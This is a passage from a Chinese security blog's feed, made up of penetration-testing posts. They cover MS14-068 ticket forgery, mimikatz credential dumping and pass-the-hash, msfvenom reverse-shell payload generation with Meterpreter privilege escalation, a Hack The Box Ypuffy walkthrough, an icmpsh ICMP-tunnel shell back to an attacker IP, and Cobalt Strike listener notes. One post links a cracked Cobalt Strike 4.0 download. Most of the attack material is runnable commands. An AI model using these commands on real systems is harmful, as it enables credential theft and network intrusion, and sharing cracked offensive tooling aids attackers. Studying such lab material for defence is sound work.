class="hljs-string">-068</span>.py -u whale@0day.org -s  S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-21</span><span class="hljs-string">-1812960810</span><span class="hljs-string">-2335050734</span><span class="hljs-string">-3517558805</span><span class="hljs-string">-1178</span> -d 192.168.1.131 -p qwe123$%<br>需要普通域用户名称<br>普通域用户sid<br>普通域用户明文密码或者hash<br></code></pre></div></td></tr></table></figure></li><li><p>mimikatz导入hash</p><figure class="highlight avrasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs avrasm">mimikatz.exe<br><span class="hljs-symbol">kerberos:</span>:list<span class="hljs-meta">#列出内存中的票据信息</span><br><span class="hljs-symbol">kerberos:</span>:purge         <span class="hljs-meta">#清除内存中的票据信息</span><br><span class="hljs-symbol">kerberos:</span>:ptc TGT_whale@rootkit<span class="hljs-meta">.org</span>.ccache(生成的高权限票据全名)<span class="hljs-meta">#导入高权限票据到内存，获得域管理员权限</span><br></code></pre></div></td></tr></table></figure><h2 id="票据传递"><a href="#票据传递" class="headerlink" title="票据传递"></a>票据传递</h2></li></ol><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">mimikatz_command -f sekurlsa::logonPasswords<br>导出登陆的密码<br><br>python <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/doc/</span>python-impacket<span class="hljs-regexp">/examples/</span>psexec.py Administrator@<span class="hljs-number">192.168</span>.<span class="hljs-number">1.2</span> cmd.exe<br><br>使用密码admin!@<span class="hljs-comment">#45，成功连接</span><br><br>使用ntlm hash，ccef208c6485269c20db2cad21734fe7，连接失败<br><br>有两种可能 <br><span class="hljs-number">1</span>. 工具psexec.py，只能使用明文密码连接<br><span class="hljs-number">2</span>. hash出错，不是ccef208c6485269c20db2cad21734fe7, 而是其他hash<br><span class="hljs-number">3</span>. windows <span class="hljs-number">2012</span> R2不支持pass the hash<br></code></pre></div></td></tr></table></figure><h3 id="NT-hash、LM-hash、NTLM-hash"><a href="#NT-hash、LM-hash、NTLM-hash" class="headerlink" title="NT hash、LM hash、NTLM hash"></a>NT hash、LM hash、NTLM hash</h3><p>LM hash的全名LAN Manager Hash，容易被破解。因此windows visa与winSever2008之后的版本默认禁用了LM hash。<br>NTLM hash取代了LM hash，安全性更高，从windowsSever2003开始，默认使用NTLM hash。</p><p>所说的NT hash就是NTLM hash，有些文档这么称呼，我还以为是两种不同的加密方式，只是称呼不同而已。</p><h3 id="mimikatz提权ntlm-hash"><a href="#mimikatz提权ntlm-hash" class="headerlink" title="mimikatz提权ntlm hash"></a>mimikatz提权ntlm hash</h3><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">mimikatz.<span class="hljs-keyword">exe</span><br><span class="hljs-built_in">log</span><br>lsadump::sam /sam:sam.hiv /<span class="hljs-built_in">system</span>:sys.hiv<br></code></pre></div></td></tr></table></figure><h3 id="查看DC机器与Web机器的hash是否一致"><a href="#查看DC机器与Web机器的hash是否一致" class="headerlink" title="查看DC机器与Web机器的hash是否一致"></a>查看DC机器与Web机器的hash是否一致</h3><figure class="highlight dns"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dns">修改web机器密码：net user administrator qwe123$%<br>保持这个密码与DC一致<br><br>DC (<span class="hljs-number">192.168.1.131</span>): <span class="hljs-number">4</span>b211aa32bcd009f4d46f52438fe433d<br>WEB(<span class="hljs-number">192.168.1.130</span>)：<span class="hljs-number">4</span>b211aa32bcd009f4d46f52438fe433d<br><br>privileg<span class="hljs-number">e::</span>debug<br>sekurls<span class="hljs-number">a::</span>pth /user:administrator /domain:<span class="hljs-number">0d</span>ay.org /ntlm:<span class="hljs-number">4</span>b211aa32bcd009f4d46f52438fe433d<br></code></pre></div></td></tr></table></figure><hr><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">mimikatz.exe <span class="hljs-string">&quot;&quot;</span>privilege::debug<span class="hljs-string">&quot;&quot;</span> <span class="hljs-string">&quot;&quot;</span>sekurlsa::logonpasswords full<span class="hljs-string">&quot;&quot;</span> <span class="hljs-keyword">exit</span> &gt;&gt; log.txt<br>一行命令，将结果保存到log.txt<br></code></pre></div></td></tr></table></figure><hr><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">sekurlsa</span>::logonpasswords<br><span class="hljs-attribute">dir</span> \\OWA<span class="hljs-number">2010</span>SP<span class="hljs-number">3</span>\C$<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>WindowsDomain</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WindowsDomain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域渗透入门</title>
    <link href="/2020/04/21/10-x/"/>
    <url>/2020/04/21/10-x/</url>
    
    <content type="html"><![CDATA[<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>乌云文章：《域内渗透基本技巧》</li><li><a href="https://www.anquanke.com/post/id/200680">Kerberos概述及常见攻击场景</a></li><li><a href="https://www.secpulse.com/archives/52379.html">Mimikatz 使用小技巧</a></li></ul><h2 id="录制的视频教程"><a href="#录制的视频教程" class="headerlink" title="录制的视频教程"></a>录制的视频教程</h2><p>首先搭一个域环境</p><ul><li><a href="https://www.bilibili.com/video/BV1Cf4y1U73y/">域渗透原理篇</a></li><li><a href="https://www.acfun.cn/v/ac14954038">域渗透实践篇（一）</a></li></ul><h2 id="工作组和域的区别"><a href="#工作组和域的区别" class="headerlink" title="工作组和域的区别"></a>工作组和域的区别</h2><ol><li>大小<br>工作组比较小，不超过20台。域用在比较大的网络，成百上千台。</li><li>拓扑图<br>工作组中，所有机器的地位是平等的，一台计算机可以自由的加入或退出一个工作组。</li><li>验证方式<br>在工作组中，用户名、密码存放在本地计算机。如果要登入其他计算机，必须提供用户名，密码；在域中，有一台域控（DC）服务器，其他计算机都要通过DC验证才能加入域。有域权限，可以登入任何域内计算机，无需知道计算机的账号也可以登入。</li><li>网络<br>工作组计算机必须在同一个子网中；域的计算机可以在不同的本地网络中。</li></ol><h2 id="获得一个shell"><a href="#获得一个shell" class="headerlink" title="获得一个shell"></a>获得一个shell</h2><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-string">生成恶意载荷</span><br><span class="hljs-string">msfvenom</span> <span class="hljs-string">-a</span> <span class="hljs-string">x86</span> <span class="hljs-string">--platform</span> <span class="hljs-string">Windows</span> <span class="hljs-string">-p</span> <span class="hljs-string">windows/meterpreter/reverse_tcp</span> <span class="hljs-string">LHOST=192.168.1.4</span> <span class="hljs-string">LPORT=6678</span> <span class="hljs-string">-e</span> <span class="hljs-string">x86/shikata_ga_nai</span> <span class="hljs-string">-b</span> <span class="hljs-string">&#x27;\x00\x0a\xff&#x27;</span> <span class="hljs-string">-i</span> <span class="hljs-number">3</span> <span class="hljs-string">-f</span> <span class="hljs-string">exe</span> <span class="hljs-string">-o</span> <span class="hljs-string">payload.exe</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">设置监听器</span><br><span class="hljs-string">handler</span> <span class="hljs-string">-H</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span> <span class="hljs-string">-P</span> <span class="hljs-number">6678</span> <span class="hljs-string">-p</span> <span class="hljs-string">windows/meterpreter/reverse_tcp</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">反弹shell成功后，进行提权</span><br><span class="hljs-string">sysinfo</span> <span class="hljs-comment">#查看windows是32位/64位</span><br><span class="hljs-string">migrate</span>         <span class="hljs-comment">#如果是64位置，需要migrate到64位进程</span><br><span class="hljs-string">search</span> <span class="hljs-string">suggester</span><br><span class="hljs-string">use</span> <span class="hljs-number">0</span><br><span class="hljs-string">set</span> <span class="hljs-string">session</span> <span class="hljs-number">1</span><br><span class="hljs-string">run</span>             <span class="hljs-comment">#查找可以利用的exp</span><br><span class="hljs-string">use</span> <span class="hljs-string">exploit/windows/local/always_install_elevated</span>  <span class="hljs-comment">#使用提权exp</span><br><span class="hljs-string">set</span> <span class="hljs-string">session</span> <span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><h2 id="meterpreter-mimikatz模块"><a href="#meterpreter-mimikatz模块" class="headerlink" title="meterpreter mimikatz模块"></a>meterpreter mimikatz模块</h2><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">     crypto- Cryptographie et certificats<br>       hash- Hash<br>     system- Gestion syst�me<br>    process- Manipulation <span class="hljs-keyword">des</span> processus<br>     thread- Manipulation <span class="hljs-keyword">des</span> threads<br>    service- Manipulation <span class="hljs-keyword">des</span> services<br>  privilege- Manipulation <span class="hljs-keyword">des</span> privil�ges<br>     handle- Manipulation <span class="hljs-keyword">des</span> handles<br>impersonate- Manipulation tokens <span class="hljs-keyword">d</span>&#x27;acc�s<br>    winmine- Manipulation du <span class="hljs-keyword">d</span>�mineur<br>minesweeper- Manipulation du <span class="hljs-keyword">d</span>�mineur 7<br>      nogpo- Anti-gpo et patchs divers<br>    samdump- Dump <span class="hljs-keyword">de</span> SAM   #导出sam密码<br>     inject- Injecteur <span class="hljs-keyword">de</span> librairies<br>         ts- Terminal Server<br>     divers- Fonctions diverses <span class="hljs-keyword">n</span>&#x27;ayant pas encore assez <span class="hljs-keyword">de</span> corps pour avoir leurs propres module<br>   sekurlsa- Dump <span class="hljs-keyword">des</span> sessions courantes par providers LSASS<br>        efs- Manipulations EFS<br></code></pre></div></td></tr></table></figure><h2 id="信息搜集-补丁查找"><a href="#信息搜集-补丁查找" class="headerlink" title="信息搜集-补丁查找"></a>信息搜集-补丁查找</h2><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-string">shell</span><br><span class="hljs-string">cd</span> <span class="hljs-string">C:\Windows\Temp</span><br><span class="hljs-string">systeminfo</span> <span class="hljs-string">&gt;</span> <span class="hljs-string">info.txt</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-string">pip</span> <span class="hljs-string">install</span> <span class="hljs-string">xlrd</span> <br><span class="hljs-string">pip</span> <span class="hljs-string">install</span> <span class="hljs-string">xlrd</span> <span class="hljs-string">-upgrade</span><br><span class="hljs-string">python</span> <span class="hljs-string">.\windows-exploit-suggester.py</span> <span class="hljs-string">--update</span><br><span class="hljs-string">python</span> <span class="hljs-string">.\windows-exploit-suggester.py</span> <span class="hljs-string">-d</span>  <span class="hljs-number">2020-04-16</span><span class="hljs-string">-mssb.xls</span> <span class="hljs-string">-i</span> <span class="hljs-string">info.txt</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>WindowsDomain</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WindowsDomain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Resilio-Sync-p2p文件共享</title>
    <link href="/2020/04/07/11-x/"/>
    <url>/2020/04/07/11-x/</url>
    
    <content type="html"><![CDATA[<p>专门为翻不了墙的同学准备的。能上外网的同学可以自行到官网下载。</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">Resilio-Sync_x64.exe<br><span class="hljs-number">22.1</span> MB<br>链接：https:<span class="hljs-regexp">//</span>pan.baidu.com<span class="hljs-regexp">/s/</span><span class="hljs-number">1</span>m6bH47VYcybOfDwTU1Vz9A <br>提取码：nnu7<br></code></pre></div></td></tr></table></figure><p><a href="https://www.bilibili.com/video/BV1Dk4y197yC">whale的福利放送——Resilio Sync文件共享</a></p><h2 id="渗透测试实战第三版，以及虚拟机靶机。"><a href="#渗透测试实战第三版，以及虚拟机靶机。" class="headerlink" title="渗透测试实战第三版，以及虚拟机靶机。"></a>渗透测试实战第三版，以及虚拟机靶机。</h2><p>共1.03GB</p><p>B5AS6IY2DUSF32QKJFQFNUTBV5VJOUFVW</p><h2 id="cobaltstrike4-0-cracked"><a href="#cobaltstrike4-0-cracked" class="headerlink" title="cobaltstrike4.0_cracked"></a>cobaltstrike4.0_cracked</h2><p>50.4 MB</p><p>BPMR36TFUT3NW3ZT2GCPDZKWUEKLPPALJ</p>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ypuffy（LDAP空连接）</title>
    <link href="/2020/03/29/09-x/"/>
    <url>/2020/03/29/09-x/</url>
    
    <content type="html"><![CDATA[<h2 id="scan"><a href="#scan" class="headerlink" title="scan"></a>scan</h2><figure class="highlight coq"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs coq"><span class="hljs-number">22</span>/tcp  open  ssh         OpenSSH <span class="hljs-number">7.7</span> (protocol <span class="hljs-number">2.0</span>)<br>| <span class="hljs-type">ssh</span>-hostkey: <br>|   <span class="hljs-type">2048</span> <span class="hljs-number">2</span>e:<span class="hljs-number">19</span>:e6:af:<span class="hljs-number">1</span>b:a7:b0:e8:<span class="hljs-number">07</span>:<span class="hljs-number">2</span>a:<span class="hljs-number">2</span>b:<span class="hljs-number">11</span>:<span class="hljs-number">5</span>d:<span class="hljs-number">7</span>b:c6:<span class="hljs-number">04</span> (RSA)<br>|   <span class="hljs-type">256</span> dd:<span class="hljs-number">0</span>f:<span class="hljs-number">6</span>a:<span class="hljs-number">2</span>a:<span class="hljs-number">53</span>:ee:<span class="hljs-number">19</span>:<span class="hljs-number">50</span>:d9:e5:e7:<span class="hljs-number">81</span>:<span class="hljs-number">04</span>:<span class="hljs-number">8</span>d:<span class="hljs-number">91</span>:b6 (ECDSA)<br>|<span class="hljs-type">_</span>  <span class="hljs-number">256</span> <span class="hljs-number">21</span>:<span class="hljs-number">9</span>e:db:bd:e1:<span class="hljs-number">78</span>:<span class="hljs-number">4</span>d:<span class="hljs-number">72</span>:b0:ea:b4:<span class="hljs-number">97</span>:fb:<span class="hljs-number">7</span>f:af:<span class="hljs-number">91</span> (ED25519)<br><span class="hljs-number">80</span>/tcp  open  http        OpenBSD httpd<br><span class="hljs-number">139</span>/tcp open  netbios-ssn Samba smbd <span class="hljs-number">3.</span>X - <span class="hljs-number">4.</span>X (workgroup: YPUFFY)<br><span class="hljs-number">389</span>/tcp open  ldap        (Anonymous bind OK)<br><span class="hljs-number">445</span>/tcp open  netbios-ssn Samba smbd <span class="hljs-number">4.7</span><span class="hljs-number">.6</span> (workgroup: YPUFFY)<br>Service <span class="hljs-keyword">Info</span>: Host: YPUFFY<br><br>Host script results:<br>|<span class="hljs-type">_clock</span>-skew: mean: <span class="hljs-number">1</span>h35m01s, deviation: <span class="hljs-number">2</span>h53m13s, median: <span class="hljs-number">-4</span>m59s<br>| <span class="hljs-type">smb</span>-os-discovery: <br>|   <span class="hljs-type">OS</span>: Windows <span class="hljs-number">6.1</span> (Samba <span class="hljs-number">4.7</span><span class="hljs-number">.6</span>)<br>|   <span class="hljs-type">Computer</span> name: ypuffy<br>|   <span class="hljs-type">NetBIOS</span> computer name: YPUFFY\x00<br>|   <span class="hljs-type">Domain</span> name: hackthebox.htb<br>|   <span class="hljs-type">FQDN</span>: ypuffy.hackthebox.htb<br>|<span class="hljs-type">_</span>  System <span class="hljs-built_in">time</span>: <span class="hljs-number">2019</span><span class="hljs-number">-02</span><span class="hljs-number">-05</span>T06:<span class="hljs-number">46</span>:<span class="hljs-number">27</span><span class="hljs-number">-05</span>:<span class="hljs-number">00</span><br>| <span class="hljs-type">smb</span>-security-mode: <br>|   <span class="hljs-type">account_used</span>: &lt;blank&gt;<br>|   <span class="hljs-type">authentication_level</span>: user<br>|   <span class="hljs-type">challenge_response</span>: supported<br>|<span class="hljs-type">_</span>  message_signing: disabled (dangerous, but default)<br>| <span class="hljs-type">smb2</span>-security-mode: <br>|   <span class="hljs-type">2</span><span class="hljs-number">.02</span>: <br>|<span class="hljs-type">_</span>    Message signing enabled but not required<br>| <span class="hljs-type">smb2</span>-<span class="hljs-built_in">time</span>: <br>|   <span class="hljs-type">date</span>: <span class="hljs-number">2019</span><span class="hljs-number">-02</span><span class="hljs-number">-05</span> <span class="hljs-number">19</span>:<span class="hljs-number">46</span>:<span class="hljs-number">27</span><br>|<span class="hljs-type">_</span>  start_date: N/A<br></code></pre></div></td></tr></table></figure><p>第一步，发现了不少于2个端口开放，简便起见，用nessus扫描一下。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-29-09/3.PNG" alt="3"></p><h2 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h2><figure class="highlight asciidoc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asciidoc">smbclient -L 10.10.10.107<br><span class="hljs-symbol">WARNING: </span>The &quot;syslog&quot; option is deprecated<br>Enter WORKGROUP\root&#x27;s password: <br>Anonymous login successful<br>OS=[Windows 6.1] Server=[Samba 4.7.6]<br><span class="hljs-section">tree connect failed: NT_STATUS_ACCESS_DENIED</span><br><span class="hljs-section">---</span><br>smbmap -P 139 -H 10.10.10.107<br>smbmap -P 445 -H 10.10.10.107<br>连接被拒绝<br></code></pre></div></td></tr></table></figure><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>连接一直重置。</p><figure class="highlight gams"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gams">-<span class="hljs-number">-2019</span><span class="hljs-number">-02</span><span class="hljs-number">-05</span> <span class="hljs-number">20</span>:<span class="hljs-number">44</span>:<span class="hljs-number">45</span>--  (try:<span class="hljs-number">18</span>)  http:<span class="hljs-comment">//10.10.10.107/</span><br>Connecting to <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.107</span>:<span class="hljs-number">80.</span>.. connected.<br><span class="hljs-function"><span class="hljs-title">HTTP</span></span> request sent, awaiting response... <span class="hljs-keyword">No</span> data received.<br>Retrying.<br></code></pre></div></td></tr></table></figure><h2 id="port389-ldap"><a href="#port389-ldap" class="headerlink" title="port389: ldap"></a>port389: ldap</h2><p>参考资料：<a href="https://blog.csdn.net/liumiaocn/article/details/83990918">LDAP基础：6：使用ldapsearch进行数据查询</a></p><figure class="highlight 1c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs 1c">远程LDAP服务器支持具有<span class="hljs-literal">NULL</span>或空基础对象的搜索请求。 这允许在不事先了解目录结构的情况下检索信息。 与<span class="hljs-literal">NULL</span> BIND结合使用，匿名用户可以使用“LdapMiner”等工具查询LDAP服务器。<br><br>请注意，有正当理由允许使用<span class="hljs-literal">NULL</span>基础的查询。<br>例如，LDAP协议的版本<span class="hljs-number">3</span>中需要提供对根DSA特定条目（DSE）的访问，其中包含有关支持的命名上下文，身份验证类型等的信息。 这也意味着合法用户可以在不事先了解其结构的情况下在目录中查找信息。<br></code></pre></div></td></tr></table></figure><p><strong>ldapsearch -h 10.10.10.107 -p 389 -x -b dc=hackthebox,dc=htb</strong></p><figure class="highlight armasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs armasm">-h 指定<span class="hljs-built_in">ip</span><br>-p 指定端口<br>-x 简单验证<br>-<span class="hljs-keyword">b</span> 设置<span class="hljs-meta">DN</span>，可以通过nmap脚本扫描到<span class="hljs-meta">DN</span>内容<br></code></pre></div></td></tr></table></figure><blockquote><p>nmap -p 389 –script ldap-search ypuffy.htb</p></blockquote><p>通过搜索关键字，发现用户名alice1978，LM密码<code>0B186E661BBDBDCF6047784DE8B9FD8B</code></p><p><code>crackmapexec ypuffy.htb -u alice1978 -H 0B186E661BBDBDCF6047784DE8B9FD8B --share</code><br>使用该口令列出445端口共享的文件，alice文件夹具有读写权限</p><p><code>smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash //ypuffy.htb/alice</code><br>发现一个文件my_private_key.ppk，这是一个ssh私钥</p><p><code>ssh -i alice.key alice1978@ypuffy.htb</code><br>得到一个普通用户权限</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对漏洞的成功利用，基于对服务的了解。</p><ul><li>ldap协议是什么？<br>Lightweight Directory Access Protocol，轻量级目录访问协议。LDAP的目的是<strong>快速响应查找需求</strong>。一次写入，多次读取。弱数据库。</li></ul>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>icmp隧道绕过防火墙</title>
    <link href="/2020/03/25/09-x/"/>
    <url>/2020/03/25/09-x/</url>
    
    <content type="html"><![CDATA[<p>当有防火墙只允许80、443等常见端口或常见的数据包协议的时候，其他类型的数据包和不允许访问的端口就会被过滤。</p><p>icmp隧道就是将不被允许的数据包使用icmp协议进行封装。同理可得，除了icmp隧道，还可以使用其他类型的协议，例如IPv6、TCP、UDP等等。</p><p><a href="https://github.com/inquisb/icmpsh">https://github.com/inquisb/icmpsh</a><br>这是一个使用icmp隧道的工具，可以将内网机器与攻击机进行连接。</p><figure class="highlight asciidoc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asciidoc">在攻击机上运行该命令，关闭icmp请求应答<br><span class="hljs-section">sysctl -w net/ipv4/icmp_echo_ignore_all=1</span><br><span class="hljs-section">---</span><br><br>git clone https://github.com/inquisb/icmpsh<br>cd icmpsh<br>python icmpsh_m.py 攻击机IP 受害机器ip<br></code></pre></div></td></tr></table></figure><p>在目标机器上运行以下命令<br><code>icmpsh.exe -t 攻击机ip -d 500 -b 30 -s 128</code></p><p>此时攻击机就会返回受害机器的cmd shell。</p><p>icmpsh缺点是只能运行在目标机器是windows的系统上。如果目标机器是linux系统，那么就要用其他办法绕过防火墙。</p>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cobalt strike（三）payload设置</title>
    <link href="/2020/03/16/11-x/"/>
    <url>/2020/03/16/11-x/</url>
    
    <content type="html"><![CDATA[<p>参考资料：</p><ul><li><a href="https://mp.weixin.qq.com/s/UGEeLxGWWwjGRykFITHlxA">Beacon原理浅析</a></li><li><a href="https://www.youtube.com/watch?time_continue=325&v=4xnBn5ZVkKE&feature=emb_title">session转发到metasploit</a></li><li><a href="https://www.cobaltstrike.com/help-listener-management">监听器设置</a></li><li><a href="https://www.cobaltstrike.com/help-scripted-web-delivery">基于web传递脚本攻击</a></li><li><a href="https://www.cobaltstrike.com/help-java-signed-applet-attack">Java Signed Applet Attack</a></li></ul><p>我录制的教程，放在b站上了：</p><ul><li><a href="https://www.bilibili.com/video/av93747219">Cobalt Strike数据管理与监听器</a></li><li><a href="https://www.bilibili.com/video/av94471795">Cobalt Strike’s beacon载荷设置</a></li><li><a href="https://www.bilibili.com/video/av95689173">Cobalt Strike’s web drive-by模块的介绍</a></li></ul><p>课程结构：</p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-number">4.</span>  Cobalt Strike监听器与构架管理<span class="hljs-number">20</span><span class="hljs-number">-22</span><br>基础结构由一个或多个团队服务器，重定向器和DNS记录组成<br>载荷引导器<br>重定向器<br>配置监听器<br>其他监听器<br>各种监听器的区别<br><br><span class="hljs-number">5.</span> Cobalt Strik<span class="hljs-string">e&#x27;s beacon载荷设置22-28</span><br><span class="hljs-string">windows/foreign/reverse_tcp</span><br><span class="hljs-string">心跳默认60s / sleep 5</span><br><span class="hljs-string">http beacon</span><br><span class="hljs-string">http和dns beacon</span><br><span class="hljs-string">smb beacon</span><br><span class="hljs-string">tcp beacon</span><br><span class="hljs-string"></span><br><span class="hljs-string">6. Cobalt Strike&#x27;</span>s web drive-<span class="hljs-keyword">by</span>模块的介绍<br>teamserver web服务器管理<br>网站克隆<br>文件托管到服务器<br>通过web传递脚本<br>三个基于java applet网页钓鱼的功能<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cobaltstrike</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cobaltstrike</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>比特币杂谈</title>
    <link href="/2020/03/14/09-x/"/>
    <url>/2020/03/14/09-x/</url>
    
